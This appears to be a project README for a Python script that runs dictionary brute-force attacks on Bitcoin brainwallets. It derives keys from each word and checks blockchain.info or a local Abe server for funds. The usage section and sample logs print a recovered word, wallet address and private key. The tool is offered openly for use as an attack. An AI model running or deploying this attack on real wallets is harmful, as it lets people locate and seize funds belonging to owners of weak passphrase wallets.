bruteforce-bitcoin-brainwallet
==============================

A python script that performs a bruteforce dictionary attack on brainwallets. It takes a dictionary input file
 and converts each word into a bitcoin address. A lookup of this address is done either using a local [Abe](https://github.com/jtobey/bitcoin-abe)
 instance or blockchain.info to see if any bitcoins have ever been received by this address. If so, it will do one more check
 to see the current balance for the bitcoin address.

#Requirements
* Dictionary file in UTF-8 format (***other formats NOT SUPPORTED***)
* Python 2.7 (***3.x NOT SUPPORTED***), requests, coinkit
<pre>
pip install -r requirements.txt
</pre>

#Usage
```
usage: bbb.py [-h] -t TYPE -d DICT_FILE -o OUTPUT_FILE [-s SERVER] [-p PORT]
              [-c CHAIN] [--version]

A script to perform bruteforce dictionary attacks on brainwallets.

optional arguments:
  -h, --help      show this help message and exit
  -t TYPE         Blockchain lookup type (abe|blockchaininfo)
  -d DICT_FILE    Dictionary file (e.g. dictionary.txt)
  -o OUTPUT_FILE  Output file (e.g. output.txt)
  -s SERVER       Abe host address (e.g. localhost)
  -p PORT         Abe port (e.g. 2751)
  -c CHAIN        Abe chain string (e.g. Bitcoin)
  --version       show program's version number and exit
```

#Abe Example
```
python bbb.py -t abe -d dictionary.txt -o found.txt -s 127.0.0.1 -p 2751 -c Bitcoin
2014-04-03 21:24:37,552 INFO   line 59   Opening session for abe
2014-04-03 21:24:37,552 INFO   line 17   Opening new session to http://127.0.0.1:2751
2014-04-03 21:24:37,563 INFO   line 171  Starting new HTTP connection (1): 127.0.0.1
2014-04-03 21:24:37,749 INFO   line 63   Opening dictionary file dictionary.txt for reading
2014-04-03 21:24:37,749 INFO   line 72   Opening output file found.txt for writing
2014-04-03 21:24:37,750 INFO   line 75   dictionary word, received bitcoins, wallet address, private address, current balance
2014-04-03 21:24:38,490 INFO   line 101  a,0.01000000,1HUBHMij46Hae75JPdWjeZ5Q7KaL7EFRSD,ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb,0.00000000
```

#Blockchain.info Example
```
python bbb.py -t blockchaininfo -d dictionary.txt -o found.txt
2014-04-03 21:38:48,893 INFO   line 100  Note there is a 10 second wait between each API call to respect posted limits
2014-04-03 21:38:48,893 INFO   line 59   Opening session for blockchaininfo
2014-04-03 21:38:48,893 INFO   line 18   Opening new session to http://blockchain.info
2014-04-03 21:38:48,903 INFO   line 171  Starting new HTTP connection (1): blockchain.info
2014-04-03 21:38:49,672 INFO   line 63   Opening dictionary file dictionary.txt for reading
2014-04-03 21:38:49,673 INFO   line 72   Opening output file found.txt for writing
2014-04-03 21:38:49,673 INFO   line 75   dictionary word, received bitcoins, wallet address, private address, current balance
2014-04-03 21:40:02,313 INFO   line 101  a,0.01000000,1HUBHMij46Hae75JPdWjeZ5Q7KaL7EFRSD,ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb,0.00000000
```
